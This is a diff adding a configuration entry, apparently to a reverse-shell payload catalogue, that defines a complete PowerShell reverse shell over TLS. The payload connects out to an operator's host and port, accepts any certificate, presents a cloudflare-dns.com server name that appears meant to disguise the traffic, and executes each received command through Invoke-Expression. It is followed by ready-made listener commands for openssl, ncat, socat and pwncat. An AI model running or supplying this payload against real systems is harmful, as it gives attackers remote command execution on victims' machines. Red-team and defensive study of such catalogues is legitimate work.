@@ -1,0 +1,17 @@
+id = "powershell_4_tls"
+name = "PowerShell #4 (TLS)"
+os = "windows"
+type = "reverse"
+proto = "tcp"
+lang = "powershell"
+description = "Establishes a TCP connection to the specified host and port, upgrades it to a TLS 1.2–encrypted SSL stream with relaxed certificate validation, executes received commands, and sends back their output with a \"SHELL>\" prompt until the connection closes."
+
+payload = "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{{LHOST}}', {{LPORT}});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+
+[listeners]
+openssl_s_server = "openssl s_server -quiet -key <YOUR_KEY_PEM> -cert <YOUR_CERT_PEM> -port {{LPORT}}"
+ncat = "ncat --ssl -lvnp {{LPORT}}"
+ncat_exe = "ncat.exe --ssl -lvnp {{LPORT}}"
+socat = "socat OPENSSL-LISTEN:{{LPORT}},cert=<YOUR_CERT_PEM>,key=<YOUR_KEY_PEM>,verify=0 STDOUT"
+socat_tty = "socat OPENSSL-LISTEN:{{LPORT}},cert=<YOUR_CERT_PEM>,key=<YOUR_KEY_PEM>,verify=0 file:`tty`,raw,echo=0"
+pwncat = "python3 -m pwncat -lp {{LPORT}} --ssl"
